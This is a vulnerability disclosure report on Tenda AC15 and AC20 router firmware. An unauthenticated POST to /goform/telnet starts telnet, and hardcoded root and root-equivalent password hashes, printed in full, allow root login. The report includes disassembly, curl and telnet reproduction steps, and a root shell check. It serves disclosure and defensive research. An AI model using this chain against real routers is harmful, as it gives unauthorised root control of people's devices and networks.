# [REDACTED-ID]_002: Unauthenticated Remote Telnet Activation → Root Shell

## Summary

The Tenda AC15 (V15.03.05.19) and AC20 (V16.03.08.12) web server exposes the `/goform/telnet` endpoint **without authentication**. This endpoint executes `system("killall -9 telnetd")` followed by `doSystemCmd("telnetd -b %s &")`, activating the telnet daemon. Combined with the hardcoded root password hash in `/etc/shadow` (identical across all devices of each model), this provides **unauthenticated remote root shell access**.

## Affected Products

| Product | Firmware Version | Architecture |
|---------|-----------------|-------------|
| Tenda AC15 | V15.03.05.19 | ARM 32-bit |
| Tenda AC20 | V16.03.08.12 | MIPS 32-bit |

## Vulnerability Details

### Authentication Bypass

The `R7WebsSecurityHandler` function (AC15: 0x0002f500, AC20: 0x00435150) explicitly whitelists `/goform/telnet` — no cookie, session, or password is required to access this endpoint.

**Confirmed via r2 disassembly:**
```
R7WebsSecurityHandler:
  0x0002f954: add r3, r4, r3   ; "/goform/telnet"
  0x0002f958: mov r1, r3       ; "/goform/telnet"
  0x0002f960: bl strncmp        ; Compare URL against whitelist
  → If match: skip authentication, allow request
```

### Telnet Activation

The `TendaTelnet` function (AC15: 0x0004fc54, size 308 bytes):

```
1. 0x0004fd04: GetValue("lan.ip") → read LAN IP from NVRAM
2. 0x0004fd14: system("killall -9 telnetd")  → kill existing telnetd
3. 0x0004fd2c: doSystemCmd("telnetd -b %s &") → start telnetd on LAN IP
4. 0x0004fd6c: websWrite("load telnetd success.") → confirm to attacker
```

### Hardcoded Root Credentials

Both AC15 and AC20 ship with identical root password hash in `/etc_ro/shadow`:
```
root:$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1:0:0:root:/root:/bin/sh
```

Additionally, the AC15 has 4 extra root-equivalent accounts with weak DES-encrypted passwords:
```
admin:6HgsSsJIEOc2U:0:0:admin:/root:/bin/sh
support:Ead09Ca6IhzZY:0:0:support:/root:/bin/sh
user:tGqcT.qjxbEik:0:0:user:/root:/bin/sh
nobody:VBcCXSNG7zBAY:0:0:nobody:/root:/bin/sh
```

DES crypt is limited to 8 characters and crackable in seconds.

## Reproduction Steps

### Step 1: Activate Telnet (No Authentication Required)

```bash
curl -X POST http://<target_ip>/goform/telnet
# Expected response: "load telnetd success."
```

### Step 2: Connect via Telnet

```bash
telnet <target_ip> 23
# Login: root
# Password: <cracked from $1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1>
# Or: admin / <cracked from DES hash>
```

### Step 3: Verify Root Access

```
# id
uid=0(root) gid=0(root)
# uname -a
Linux ... armv7l (AC15) / mips (AC20)
```

## Impact

- **Pre-authentication:** No login required — any network-adjacent attacker can activate telnet
- **Root access:** Hardcoded credentials provide root shell
- **LAN-only shell:** `telnetd -b <lan_ip>` binds to LAN interface — shell not accessible from WAN
- **Persistence:** Telnet remains active until device reboot
- **Full compromise:** Read/modify all config, intercept traffic, pivot to LAN

## CVSS v3.1

**Score: 8.8 (High)** — AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

No authentication required. **Adjacent Network** vector — HTTP trigger is network-accessible but telnet shell binds to LAN IP only. Full exploitation requires LAN access.

## CWE Classification

- **CWE-306:** Missing Authentication for Critical Function
- **CWE-912:** Hidden Functionality
- **CWE-798:** Use of Hard-coded Credentials

## Relationship to Known CVEs

- **CVE-2025-9090:** Command injection in Tenda AC20 `/goform/telnet` — related but different bug class (that CVE is about parameter injection, this finding is about the unauthenticated activation itself)
- **CVE-2020-35391:** Known telnet backdoor in earlier Tenda firmware

## Live Validation Results

Tested against authorized internet-facing Tenda AC10U targets:
- **Trigger:** `POST /goform/telnet` accepted (HTTP timeout consistent with execution)
- **Port 23:** Remained "filtered" from WAN after trigger — confirms `telnetd` binds to LAN IP
- **Conclusion:** Vulnerability is confirmed but exploitation requires LAN-adjacent position

## Status

- **Discovery:** Static analysis via r2 disassembly of R7WebsSecurityHandler + TendaTelnet
- **Emulation Validation:** CONFIRMED (strace: `execve("telnetd -b [REDACTED-INTERNAL-IP] &")`)
- **Live Validation:** Trigger accepted by live targets; shell LAN-only (port 23 filtered from WAN)
- **Disclosure:** CERT/CC after 7-day vendor attempt
